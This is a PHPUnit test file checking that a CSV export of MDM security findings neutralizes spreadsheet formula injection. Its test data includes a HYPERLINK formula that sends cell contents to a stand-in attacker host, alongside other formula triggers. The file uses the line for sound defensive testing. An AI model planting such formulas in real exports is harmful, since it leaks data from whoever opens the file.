<?php

declare(strict_types=1);

use PHPUnit\Framework\TestCase;

/**
 * export_mcp_findings() writes finding messages and metadata to CSV. Those
 * values come from whichever scanner pushed the finding, so a leading =, +, -,
 * @, tab or CR would be executed as a formula when an operator opens the file
 * in Excel, LibreOffice or Google Sheets.
 */
final class CsvInjectionTest extends TestCase
{
    /**
     * @dataProvider dangerousLeadingCharacters
     */
    public function testFormulaTriggersArePrefixed(string $value): void
    {
        $this->assertSame(
            "'" . $value,
            Simplemdm_mcp_finding_model::neutralizeCsvField($value),
            'A value starting with a formula trigger must be quoted so the spreadsheet treats it as text.'
        );
    }

    public static function dangerousLeadingCharacters(): array
    {
        return [
            'equals'       => ['=HYPERLINK("https://attacker.example/?d="&A1,"ok")'],
            'plus'         => ['+1+1'],
            'minus'        => ['-1+1'],
            'at'           => ['@SUM(A1:A9)'],
            'tab'          => ["\t=1+1"],
            'carriage'     => ["\r=1+1"],
            'leading space then equals' => ['   =1+1'],
        ];
    }

    /**
     * @dataProvider harmlessValues
     */
    public function testOrdinaryValuesAreUntouched(string $value): void
    {
        $this->assertSame(
            $value,
            Simplemdm_mcp_finding_model::neutralizeCsvField($value),
            'Normal finding text must survive the export unchanged.'
        );
    }

    public static function harmlessValues(): array
    {
        return [
            'empty'          => [''],
            'whitespace'     => ['   '],
            'message'        => ['FileVault is disabled on this device'],
            'serial'         => ['C07YP1CWJYW0'],
            'timestamp'      => ['2026-08-07T19:30:00+00:00'],
            'json blob'      => ['{"severity":"danger","count":3}'],
            'inner equals'   => ['os_version=15.2'],
            'inner minus'    => ['macOS 15.2 - out of date'],
        ];
    }

    public function testNonStringInputIsCoercedNotCorrupted(): void
    {
        $this->assertSame('42', Simplemdm_mcp_finding_model::neutralizeCsvField(42));
        $this->assertSame('', Simplemdm_mcp_finding_model::neutralizeCsvField(null));
    }

    public function testExportRoutesEveryColumnThroughTheSanitizer(): void
    {
        $src = (string) file_get_contents(
            __DIR__ . '/../../simplemdm_controller.php'
        );

        $this->assertMatchesRegularExpression(
            '/fputcsv\(\$out, \$line\)/',
            $src,
            'Expected export_mcp_findings() to still build rows into $line before writing.'
        );

        $this->assertStringContainsString(
            'Simplemdm_mcp_finding_model::neutralizeCsvField(',
            $src,
            'export_mcp_findings() must pass every cell through neutralizeCsvField() before fputcsv().'
        );

        $this->assertDoesNotMatchRegularExpression(
            '/\$line\[\] = isset\(\$row\[\$col\]\)/',
            $src,
            'A raw $row value is being written to CSV again — formula injection has regressed.'
        );
    }
}
